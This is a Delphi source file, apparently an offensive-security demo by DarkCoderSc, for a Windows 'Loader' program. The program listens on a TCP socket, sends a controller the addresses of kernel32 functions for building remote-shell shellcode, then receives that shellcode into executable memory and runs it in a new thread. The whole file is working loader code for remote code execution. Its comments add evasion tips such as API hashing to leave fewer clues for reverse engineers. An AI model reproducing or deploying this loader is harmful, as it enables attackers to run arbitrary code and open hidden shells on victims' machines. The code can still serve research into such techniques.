{******************************************************************************}
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{******************************************************************************}


        (*MMMMMMMMMMMMMMMMNKkdl:;,,,,'',,,,;cok0NWMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMWXOdlc:;;::::::::::::;;;;:ldOXWMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMNOo:;:cllllooooooollllllccc::;;cd0WMMMMMMMMMMMMMMMMM
        MMMMMMMMMMNOl::looooooooooooooooooooooollc::;:dKWMMMMMMMMMMMMMMM
        MMMMMMMMMXd:cooooooooooooooodddddddddooooolc::;cOWMMMMMMMMMMMMMM
        MMMMMMMMKo:looooooooooooooodxkkkkkkkxxddoooolc:;:OWMMMMMMMMMMMMM
        MMMMMMMXo:loooooooooooooddodxxkkkkkkkkxxdoooooc:;c0MMMMMMMMMMMMM
        MMMMMMWx:looooooooooooodxxdoddxkkkkkkkkxdooooooc:,oNMMMMMMMMMMMM
        MMMMMMXl:ooooooooooooooodddooodddddxxxddoooooooc:;:0MMMMMMMMMMMM
        MMMMMMO::ooooooooooooooooooooooooooooooooooooooc:;;xWMMMMMMMMMMM
        MMMMMWx;:loooooooooooooooooooooooooooooooooooolc::,dNMMMMMMMMMMM
        MMMMMWx;:looooooooooooooooooooooooooooooooooolc:::,oNMMMMMMMMMMM
        MMMMMWx;:loooooooooooooooooooooooooooooooooolc::::,dNMMMMMMMMMMM
        MMMMMMO;;cloooooooooooooooooooooooooooooooolc::::;;xWMMMMMMMMMMM
        MMMMMMKc,:cooooooooooooooooooooooooooooooolc:::::;:0MMMMMMMMMMMM
        MMMMMMWk;;:clooooooooooooooooooooooooooolc:::::::,oNMMMMMMMMMMMM
        MMMMMMMNd;::clloooooooooooooooooooooooolc:::::::;,cdxOKWMMMMMMMM
        MMMMMMMMXo,;::cclloooooooooooooooooolcc::::::;;;';cllccokXWMMMMM
        MMMMMMN0dl:,,:::::ccclllllllllllllcc:::::;;;;:ccccccldxoclONMMMM
        MMMMNOlcccc:;;;;::ccccccc::::::::::ccc:;,;codxxxxddoc:lxxl:kWMMM
        MMMNd;;:ccldddoc:;;;::::::::::;;;;;;;;;;codxoodxdlcloc;cddcc0MMM
        MMNd,,;codddxxxxdoc;,',,;:::cc:,,,',;:::coo::lol:,,coo:;clc;xWMM
        MWk;',cllloodddoddolc;,;::::cc:;;,':l;',ll;,cc;:cc:::cc;,::,lXMM
        MXl,,;c,,,;;:cll:cl::c:,;::::::::;,::''cc,.;:,:dxxxdc;:c;,:;cKMM
        MO:',:;,clcc:;;cc;:oc;:;,;::::;:::;,,',c;'';;;oxkkkkxc;cl:,,:0MM
        Wk;';;;lxxxxxo:;lc,:oc,'',,;;::::::;;'',,;:,,cdxkkxxdl;:ooc';0MM
        Wk,';;;odddxxxo:;;;;::,'';;,,,,,,,,,'''',;:ccoddddddol;:oool:lkN
        Wx;;:;:ooooooooolclollc:,,::::::::;,;;,;:;,;;cooooollo:;looool:l
        x:co:,:oooooooooooooddoc;,,::::::;,:c;',,,:;,:ooool:co:,coooool;
        :col;';lol:clloooooodddl:;';:::,,;colc;;;;,,:ooooo:,co:,;oooooc:
        ;llc,';:cc:,;:ccloooodxdl:;,,;,;codolc:::;':oooooc,':c:,,lool:lO
        ;cc:,';::::;,,;::clooodxdoc;,';oddooc:::;,,looooc,',;::;,:ccokXM
        x:;;,',::::::;,,,;:looooddol::looolc;;;,,;cooll:,'';:::;;oOKNMMM
        WOl,'',:::::::;,,',;:cloooooooooolc;,'',;:ccc:;'',;::::;c0MMMMMM
        MMN0xc,;:::;,,,;,,,'',;cloddoooool:,',;:::::;,',;:ccc::,lXMMMMMM
        MMMMM0:;:;,'''';;;;,,''';lddoooolc,';::::;;,,,;clooolc:,dWMMMMMM
        MMMMMNo,:;','''';clc::;,,;loooolc:'';;,,,,,;:clooooolc;:OMMMMMMM
        MMMMMMKc;:;;,,',,;:loooo:,:ooolc:;''''',;:ccloooooooc:,oXMMMMMMM
        MMMMMMWKl;::cc;,,'',:loooc;;:::,,''''';:cclooooooool:;:OWMMMMMMM
        MMMMMMMMXx:;coollc:;,,;coooc:;;;;;;'.';:looooooooolc;:OWMMMMMMMM
        MMMMMMMMMW0o::looooolc;,;:looooollc,.';:loooooollc;;oKWMMMMMMMMM
        MMMMMMMMMMMW0dc::loooool:,,:clllll:',;:::cccccc:;;lONMMMMMMMMMMM
        MMMMMMMMMMMMMWXko:;:llolc:;;,,;;;,,;:::::::::;;cdONMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMWKko:;:::;;;;;;;;;;;;;;::;;cox0XWMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMWKd;;:;;;,,,,,,;;;;::;cONWMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMMMWk;;::::::::::::::;;kWMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMMMMXl,::::::::::::::;oXMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMMMMXl,:::::::::::::;cKMMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMMMMMMMMMWk;;::::::::::::;c0WMMMMMMMMMMMMMMMMMMMMMMM
        MXxx0XWMMMMMMMMMMMMMNx:;::::::::::::;lKWMMMMMMMMMMMMMMMMMMMMMMMM
        MKc,;cldkOKXNNNNXKOdc;;::::::::::;;cxNMMMMMMMMMMMMMMMMMMMMMMMMMM
        MMXx:;;;;;::cccc::;;:::::::::;;;:lxXWMMMMMMMMMMMMMMMMMMMMMMMMMMM
        MMMWXOdl:;;;;:::::::::::;;;;;,,:oxKXWMMMMMMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMNKOkddolcccccccloodk0K0d:;;cxKWMMMMMMMMMMMMMMMMMMMMMMMMMM
        MMMMMMMMMMMMMWNXXKKKKXNWMMMMMMW0kk0NWMMMMMMMMMMMMMMMMMMMMMMMMM*)

program Loader;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  Winapi.Winsock2,
  Winapi.Windows,
  System.SysUtils,

  uSharedTypes in '..\Shared\uSharedTypes.pas',
  uSharedFunctions in '..\Shared\uSharedFunctions.pas',
  uSharedExceptions in '..\Shared\uSharedExceptions.pas';

{ Configuration }
const SERVER_PORT      = 2801;
      SERVER_INTERFACE = '127.0.0.1';

{ Entrypoint }
var AWSAData               : TWSAData;
    AServer                : TSocket;
    ASockAddrIn            : TSockAddrIn;
    AClient                : TSocket;
    AFuncInRemoteShellInfo : TFuncIn__RemoteShell__Information;
    hKernel32              : THandle;
    AShellcodeSize         : Int64;
    pShellcode             : Pointer;
    AThreadId              : DWORD;

begin
  IsMultiThread := True;
  try
    WSAStartup(MakeWord(2, 2), AWSAData);
    try
      { Create a new TCPv4 Socket }
      AServer := WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nil, 0, 0);
      if AServer = INVALID_SOCKET then
        raise ESocketException.Create('WSASocket');

      WriteLn(Format('Server Socket=[%d(%x)]', [
        AServer,
        AServer
      ]));

      { Bind Socket }
      ZeroMemory(@ASockAddrIn, SizeOf(TSockAddrIn));

      ASockAddrIn.sin_port        := htons(SERVER_PORT);
      ASockAddrIn.sin_family      := AF_INET;

      if (SERVER_INTERFACE = '') or (SERVER_INTERFACE = '0.0.0.0') then
        ASockAddrIn.sin_addr.S_addr := INADDR_ANY
      else
        ASockAddrIn.sin_addr.S_addr := inet_addr(SERVER_INTERFACE);

      if bind(AServer, TSockAddr(ASockAddrIn), SizeOf(TSockAddrIn)) = SOCKET_ERROR then
        raise ESocketException.Create('bind');

      { Listen on Socket }
      if listen(AServer, SOMAXCONN) = SOCKET_ERROR then
        raise ESocketException.Create('listen');

      WriteLn('Listening...');

      { Catching new Clients }
      while True do begin
        ACLient := WSAAccept(AServer, nil, nil, nil, 0);
        if AClient = INVALID_SOCKET then
          break;

        WriteLn(Format('New client socket=[%d(%x)] connected!', [
          ACLient,
          ACLient
        ]));

        ///

        AFuncInRemoteShellInfo.Header.Architecture := aUnsupported;

        {$IFDEF WIN32}
          AFuncInRemoteShellInfo.Header.Architecture := x86_32;
        {$ENDIF}

        {$IFDEF WIN64}
          AFuncInRemoteShellInfo.Header.Architecture := x86_64;
        {$ENDIF}

        hKernel32 := GetModuleHandle('KERNEL32.DLL');

        // Since bellow structures may change between architecture, you have two choice,
        // First one is to dynamically gather expected size from the loader size (Like here)
        // Or to leave less clues, you can hardcode those values in the controller and choose
        // The correct hardcoded value depending on loader architecture.
        AFuncInRemoteShellInfo.StartupInformationLen := SizeOf(TStartupInfoA);
        AFuncInRemoteShellInfo.ProcessInformationLen := SizeOf(TProcessInformation);

        AFuncInRemoteShellInfo.SocketFd := AClient;

        // This demo demonstrate JIT Shellcode Compilation, notice that you could also use
        // API hashing and dynamic loading to avoid pre-loading / pre-computin libraries / APIs.
        // The advantage here, is to improve shellcode SIZE and READABILITY.
        // Both technique tho, are equally valid.
        // Notice that, API Hashing or any additional equivalent technique will leave less clue
        // during reverse engineering.
        AFuncInRemoteShellInfo.__WaitForSingleObject := NativeUInt(GetProcAddress(hKernel32, 'WaitForSingleObject'));
        AFuncInRemoteShellInfo.__CreateProcessA      := NativeUInt(GetProcAddress(hKernel32, 'CreateProcessA'));
        AFuncInRemoteShellInfo.__ExitThread          := NativeUInt(GetProcAddress(hKernel32, 'ExitThread'));

        WriteLn('Sending FuncIn information for JIT Shellcode Compilation...');

        WriteLn('[DEBUG] FuncIn Information Dump:');
          WriteLn(BufferToHexView(@AFuncInRemoteShellInfo, SizeOf(TFuncIn__RemoteShell__Information)));

        if send(AClient, AFuncInRemoteShellInfo, SizeOf(TFuncIn__RemoteShell__Information), 0) <= 0 then begin
          CloseSocket(AClient);

          continue;
        end;

        { Catch FuncIn-Shellcode from Controller }
        AShellcodeSize := RecvInt64(AClient);
        if AShellcodeSize > 0 then begin
          pShellCode := VirtualAlloc(nil, AShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          if not Assigned(pShellCode) then
            raise EWindowsException.Create('VirtualAlloc');

          WriteLn(Format('Receiving Shellcode, Size=[%d] bytes...', [
            AShellcodeSize
          ]));

          if recv(AClient, PByte(pShellCode)^, AShellcodeSize, 0) <> AShellcodeSize then
            raise ESocketException.Create('recv');

          WriteLn('[DEBUG] Shellcode Dump:');
          WriteLn(BufferToHexView(pShellCode, AShellcodeSize));


          { Execute Shellcode }
          if CreateThread(nil, 0, pShellCode, nil, 0, AThreadId) = 0 then
            raise EWindowsException.Create('CreateThread');

          ///
          WriteLn(Format('Shellcode Executed, offset=[%p], thread_id=[%d]', [
            pShellCode,
            AThreadId
          ]));
        end;
      end;

      ///
      CloseSocket(AServer);
    finally
      WSACleanup();
    end;

    ///
    WriteLn('"Destruction is a form of creation", Donnie Darko');
    WriteLn('...Until we meet again...');
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;

end.


